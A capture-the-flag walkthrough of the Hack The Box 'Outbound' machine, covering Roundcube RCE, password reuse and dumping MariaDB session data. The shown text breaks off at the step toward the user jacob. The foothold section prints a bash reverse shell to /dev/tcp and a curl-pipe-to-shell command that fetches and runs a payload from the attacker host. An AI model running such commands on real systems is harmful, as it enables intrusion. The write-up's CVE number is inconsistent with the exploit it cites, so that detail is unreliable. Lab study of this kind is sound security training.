---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Easy
  - Roundcube
  - CVE-2025-49112
  - InsecureDeserialization
  - Docker
  - Container
  - PasswordReuse
  - MariaDB
  - Decrypter
  - PlaintextCredentials
  - Below
  - CVE-2021-27591
---

![](images/Outbound.png)

## Table of Contents

- [Summary](#Summary)
- [Introduction](#Introduction)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port   80/TCP](#Enumeration-of-Port-80TCP)
- [Foothold](#Foothold)
    - [CVE-2025-49112: Insecure Deserialization into Remote Code Execution (RCE) in Roundcube](#CVE-2025-49112-Insecure-Deserialization-into-Remote-Code-Execution-RCE-in-Roundcube)
- [Enumeration (www-data)](#Enumeration-www-data)
- [Privilege Escalation to tyler](#Privilege-Escalation-to-tyler)
    - [Password Reuse](#Password-Reuse)
- [Stabilizing Shell](#Stabilizing-Shell)
- [Enumeration (tyler)](#Enumeration-tyler)
- [MariaDB Database Enumeration](#MariaDB-Database-Enumeration)
- [Privilege Escalation to jacob](#Privilege-Escalation-to-jacob)
    - [Decoding Base64](#Decoding-Base64)
- [Enumeration (jacob)](#Enumeration-jacob)
    - [Plaintext Credentials](#Plaintext-Credentials)
- [user.txt](#usertxt)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [CVE-2021-27591: Below World Writable Directory in /var/log/below Local Privilege Escalation](#CVE-2021-27591-Below-World-Writable-Directory-in-varlogbelow-Local-Privilege-Escalation)
- [root.txt](#roottxt)

## Summary

The box starts with a `vulnerability` in `Roundcube` which is known as `CVE-2025-49112`. It describes a `Insecure Deserialization` in version `1.6.10` of `Roundcube` that leads to `Remote Code Execution (RCE)`.

After gaining a shell as `www-data` inside the `Docker Container` the first `Privilege Escalation` can be achieved by a simple `Password Reuse` and a switch of the user context.

At this point if not already before when getting a shell as `www-data`, some `credentials` for the `MariaDB Database` can be found within a `configuration file` in the `/var/www/html/roundcube` directory.

Within the `database` sensitive information `encoded` in `Base64` can be found. After decoding they contain a `hashed password` which can be simply `decrypted` using the `decrypt.sh` script of `Roundcube`.

This leads to the next `privesc` and to `plaintext password` within an `email`. This `password` finally allows to login on the box itself via `SSH` and to grab the `user.txt`.

For the last step it is necessary to abuse an application called `below` which can be executed using `sudo` by `symlinking` `/etc/group` to a `error log` file. This changes the `permissions` on the `file` and make it `writeable`. Everything that is now left is to add the current user to the `group` of `sudo`, `re-login` back to the box and `escalate` the `privileges` to `root`.

## Introduction

As is common in real life pentests, you will start the Outbound box with credentials for the following account `tyler / LhKL1o9Nm3X2`

## Reconnaissance

### Port Scanning

As usual we started with our initial `port scan` using `Nmap`. The output showed the `redirect` to `http://mail.outbound.htb`.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.229.137
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-12 21:02 CEST
Nmap scan report for 10.129.229.137
Host is up (0.050s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.89 seconds
```

### Enumeration of Port   80/TCP

We added `mail.outbound.htb` to our `/etc/hosts` file and accessed the website.

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.229.137  mail.outbound.htb
```

- [http://mail.outbound.htb/](http://mail.outbound.htb/)

Then we got greeted with the `login page` of `Roundcube`.

![](images/2025-07-12_21-03_80_roundcube_login.png)

Since we had `credentials` we were able to `login` as `tyler`.

| Username | Password     |
| -------- | ------------ |
| tyler    | LhKL1o9Nm3X2 |

Within the `About` section we found the `information` about the `version` of `Roundcube`.

| Version |
| ------- |
| 1.6.10  |

![](images/2025-07-12_23-24_80_roundcube_dashboard_version.png)

## Foothold

### CVE-2025-49112: Insecure Deserialization into Remote Code Execution (RCE) in Roundcube

A quick research offered us some `Proof of Concept (PoC)` exploits for `CVE-2025-49112` which describes `Insecure Deserialization` in `Roundcube` which leads to `Remote Code Execution (RCE)`.

- [https://github.com/hakaioffsec/CVE-2025-49113-exploit](https://github.com/hakaioffsec/CVE-2025-49113-exploit)

We prepared our `staged payload` and executed the `exploit` which granted us `foothold` as `www-data` after a few seconds.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Outbound/serve]
└─$ cat x 
#!/bin/bash
bash -c '/bin/bash -i >& /dev/tcp/10.10.16.48/9001 0>&1'
```

```shell
┌──(kali㉿kali)-[/media/…/Machines/Outbound/files/CVE-2025-49113-exploit]
└─$ php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 'curl 10.10.16.48/x|sh'
```

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ... 
connect to [10.10.16.48] from (UNKNOWN) [10.129.229.137] 57598
bash: cannot set terminal process group (247): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail:/$
```

## Enumeration (www-data)

A quick check of our `current working directory` showed that we landed in a `Docker Container`.

```shell
www-data@mail:/$ ls -la  
ls -la
total 84
drwxr-xr-x   1 root root 4096 Jul  9 12:41 .
drwxr-xr-x   1 root root 4096 Jul  9 12:41 ..
-rwxr-xr-x   1 root root    0 Jun  8 12:26 .dockerenv
lrwxrwxrwx   1 root root    7 Apr 22  2024 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Mar 31  2024 bin.usr-is-merged
drwxr-xr-x   2 root root 4096 Apr 22  2024 boot
drwxr-xr-x   5 root root  340 Jul 12 22:32 dev
drwxr-xr-x   1 root root 4096 Jul  9 12:41 etc
drwxr-xr-x   1 root root 4096 Jun  8 12:05 home
lrwxrwxrwx   1 root root    7 Apr 22  2024 lib -> usr/lib
drwxr-xr-x   2 root root 4096 Nov 14  2024 lib.usr-is-merged
lrwxrwxrwx   1 root root    9 Apr 22  2024 lib64 -> usr/lib64
drwxr-xr-x   2 root root 4096 May 29 02:14 media
drwxr-xr-x   2 root root 4096 May 29 02:14 mnt
drwxr-xr-x   2 root root 4096 May 29 02:14 opt
dr-xr-xr-x 364 root root    0 Jul 12 22:32 proc
drwx------   1 root root 4096 Jun  8 15:39 root
drwxr-xr-x   1 root root 4096 Jun  6 18:55 run
lrwxrwxrwx   1 root root    8 Apr 22  2024 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Mar 31  2024 sbin.usr-is-merged
drwxr-xr-x   2 root root 4096 May 29 02:14 srv
dr-xr-xr-x  13 root root    0 Jul 12 22:34 sys
drwxrwxrwt   1 root root 4096 Jul 12 22:34 tmp
drwxr-xr-x  12 root root 4096 May 29 02:14 usr
drwxr-xr-x   1 root root 4096 Jun  6 18:55 var
```

## Privilege Escalation to tyler

### Password Reuse

Since we had already a `password` we just tried to `escalate` our `privilges` to `tyler` by `reusing` his `password`. And it worked.

```shell
www-data@mail:/$ su tyler
su tyler
Password: LhKL1o9Nm3X2
id
uid=1000(tyler) gid=1000(tyler) groups=1000(tyler)
```

## Stabilizing Shell

This gave us some weird shell which we upgraded using `script` because `Python` was not available.

```shell
script -q /dev/null -c bash
tyler@mail:~$
```

## Enumeration (tyler)

A quick look into the `/etc/passwd` showed us two more users.

```shell
tyler@mail:~$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_galera:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:101:MariaDB Server,,,:/nonexistent:/bin/false
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
dovecot:x:102:103:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:103:104:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
postfix:x:104:105::/var/spool/postfix:/usr/sbin/nologin
tyler:x:1000:1000::/home/tyler:/bin/bash
jacob:x:1001:1001::/home/jacob:/bin/bash
mel:x:1002:1002::/home/mel:/bin/bash
```

| Usernames |
| --------- |
| jacob     |
| mel       |

Then we moved back to `/var/www/html` and started looking for more `credentials` in `configuration files` because we skipped basically the `enumeration` of `www-data`.

Within `config.inc.php` we found `credentials` for the `MariaDB` instance.

```shell
tyler@mail:/var/www/html/roundcube/config$ cat config.inc.php
cat config.inc.php
<?php

/*
 +-----------------------------------------------------------------------+
 | Local configuration for the Roundcube Webmail installation.           |
 |                                                                       |
 | This is a sample configuration file only containing the minimum       |
 | setup required for a functional installation. Copy more options       |
 | from defaults.inc.php to this file to override the defaults.          |
 |                                                                       |
 | This file is part of the Roundcube Webmail client                     |
 | Copyright (C) The Roundcube Dev Team                                  |
 |                                                                       |
 | Licensed under the GNU General Public License version 3 or            |
 | any later version with exceptions for skins & plugins.                |
 | See the README file for a full license statement.                     |
 +-----------------------------------------------------------------------+
*/

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config['imap_host'] = 'localhost:143';

// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config['smtp_host'] = 'localhost:587';

// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config['smtp_user'] = '%u';

// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';

// provide an URL where a user can get support for this Roundcube installation
// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
$config['support_url'] = '';

// Name your service. This is displayed on the login screen and in the window title
$config['product_name'] = 'Roundcube Webmail';

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

// List of active plugins (in plugins/ directory)
$config['plugins'] = [
    'archive',
    'zipdownload',
];

// skin name: folder from skins/
$config['skin'] = 'elastic';
$config['default_host'] = 'localhost';
$config['smtp_server'] = 'localhost';
```

| Username  | Password     |
| --------- | ------------ |
| roundcube | RCDBPass2025 |

## MariaDB Database Enumeration

With the `credentials` we logged into the database and started enumerating it.

```shell
tyler@mail:/var/www/html/roundcube/config$ mysql -u roundcube -p
mysql -u roundcube -p
Enter password: RCDBPass2025

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 81
Server version: 10.11.13-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

```shell
MariaDB [(none)]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| roundcube          |
+--------------------+
2 rows in set (0.001 sec)
```

```shell
MariaDB [(none)]> use roundcube;
use roundcube;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

```shell
MariaDB [roundcube]> show tables;
show tables;
+---------------------+
| Tables_in_roundcube |
+---------------------+
| cache               |
| cache_index         |
| cache_messages      |
| cache_shared        |
| cache_thread        |
| collected_addresses |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| filestore           |
| identities          |
| responses           |
| searches            |
| session             |
| system              |
| users               |
+---------------------+
17 rows in set (0.001 sec)
```

```shell
MariaDB [roundcube]> select * from users \G;
select * from users \G;
*************************** 1. row ***************************
             user_id: 1
            username: jacob
           mail_host: localhost
             created: 2025-06-07 13:55:18
          last_login: 2025-06-11 07:52:49
        failed_login: 2025-06-11 07:51:32
failed_login_counter: 1
            language: en_US
         preferences: a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}
*************************** 2. row ***************************
             user_id: 2
            username: mel
           mail_host: localhost
             created: 2025-06-08 12:04:51
          last_login: 2025-06-08 13:29:05
        failed_login: NULL
failed_login_counter: NULL
            language: en_US
         preferences: a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}
*************************** 3. row ***************************
             user_id: 3
            username: tyler
           mail_host: localhost
             created: 2025-06-08 13:28:55
          last_login: 2025-07-12 19:09:18
        failed_login: 2025-06-11 07:51:22
failed_login_counter: 1
            language: en_US
         preferences: a:1:{s:11:"client_hash";s:16:"Y2Rz3HTwxwLJHevI";}
3 rows in set (0.000 sec)

ERROR: No query specified
```

The information in the `table` of `users` didn't lead us anywhere so we headed back to the directory of `roundcube` and found a script called `decrypt.sh` within `/var/www/html/roundcube/bin`.

```shell
tyler@mail:/var/www/html/roundcube/bin$ ls -lah
ls -lah
total 100K
drwxr-xr-x 2 www-data www-data 4.0K Feb  8 08:47 .
drwxr-xr-x 1 www-data www-data 4.0K Jun  6 18:55 ..
-rwxr-xr-x 1 www-data www-data 1.3K Feb  8 08:47 cleandb.sh
-rwxr-xr-x 1 www-data www-data  947 Feb  8 08:47 cssshrink.sh
-rwxr-xr-x 1 www-data www-data 2.7K Feb  8 08:47 decrypt.sh
-rwxr-xr-x 1 www-data www-data 4.7K Feb  8 08:47 deluser.sh
-rwxr-xr-x 1 www-data www-data 1.7K Feb  8 08:47 gc.sh
-rwxr-xr-x 1 www-data www-data 1.4K Feb  8 08:47 indexcontacts.sh
-rwxr-xr-x 1 www-data www-data 2.0K Feb  8 08:47 initdb.sh
-rwxr-xr-x 1 www-data www-data 6.3K Feb  8 08:47 installto.sh
-rwxr-xr-x 1 www-data www-data 1.3K Feb  8 08:47 jsshrink.sh
-rwxr-xr-x 1 www-data www-data  529 Feb  8 08:47 makedoc.sh
-rwxr-xr-x 1 www-data www-data 2.4K Feb  8 08:47 moduserprefs.sh
-rwxr-xr-x 1 www-data www-data 4.4K Feb  8 08:47 msgexport.sh
-rwxr-xr-x 1 www-data www-data 3.7K Feb  8 08:47 msgimport.sh
-rwxr-xr-x 1 www-data www-data  13K Feb  8 08:47 update.sh
-rwxr-xr-x 1 www-data www-data 3.7K Feb  8 08:47 updatecss.sh
-rwxr-xr-x 1 www-data www-data 1.8K Feb  8 08:47 updatedb.sh
```

We asked our `AI` buddy where else to look for sensitive information and got `session` as answer.

```shell
MariaDB [roundcube]> select * from session \G;
select * from session \G;
*************************** 1. row ***************************
sess_id: 2ooi06i0e3qkuoi9tckj18duis
changed: 2025-07-12 20:01:10
     ip: 172.17.0.1
   vars: dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRhcmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJOVjBTd2d5NGpKRXNZRDJ3Q2l3d1FCdWU2cFpXRllPZCI7
*************************** 2. row ***************************
sess_id: 6a5ktqih5uca6lj8vrmgh9v0oh
changed: 2025-06-08 15:46:40
     ip: 172.17.0.1
   vars: bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7
2 rows in set (0.001 sec)

ERROR: No query specified
```

## Privilege Escalation to jacob
### Decoding Base64

We `decoded` the `Base64` encoded data and feeded it to the `decrypter.sh` file which resulted in a `password` for the user `jacob`.

```shell
┌──(kali㉿kali)-[~]
└─$ echo "dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRhcmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJOVjBTd2d5NGpKRXNZRDJ3Q2l3d1FCdWU2cFpXRllPZCI7" | base64 -d
temp|b:1;language|s:5:"en_US";task|s:5:"login";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}request_token|s:32:"NV0Swgy4jJEsYD2wCiwwQBue6pZWFYOd";
```

```shell
┌──(kali㉿kali)-[~]
└─$ echo "bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7" | base64 -d
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is 